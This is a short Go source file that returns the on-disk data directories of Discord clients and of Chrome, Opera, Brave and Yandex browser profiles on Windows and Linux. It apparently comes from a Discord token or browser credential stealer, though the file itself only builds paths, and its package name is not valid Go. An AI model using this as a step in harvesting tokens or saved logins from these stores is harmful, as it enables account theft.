package getDirs.go

import (
	"os"
	"runtime"
)

func GetDirs() map[string]string {
	if runtime.GOOS == "windows" {
		local := os.Getenv("LOCALAPPDATA")
		roaming := os.Getenv("APPDATA")
		return map[string]string{
			"Discord":        roaming + "/Discord",
			"Discord Canary": roaming + "/discordcanary",
			"Discord PTB":    roaming + "/discordptb",
			"Google Chrome":  local + "/Google/Chrome/User Data/Default",
			"Opera":          roaming + "/Opera Software/Opera Stable",
			"Brave":          local + "/BraveSoftware/Brave-Browser/User Data/Default",
			"Yandex":         local + "/Yandex/YandexBrowser/User Data/Default",
		}
	} else {
		home, _ := os.UserHomeDir()
		return map[string]string{
			"Discord":        home + "/.config/discord",
			"Discord Canary": home + "/.config/discordcanary",
			"Discord PTB":    home + "/.config/discordptb",
			"Google Chrome":  home + "/.config/google-chrome/Default",
			"Opera":          home + "/.config/opera",
			"Brave":          home + "/.config/BraveSoftware",
		}
	}
}
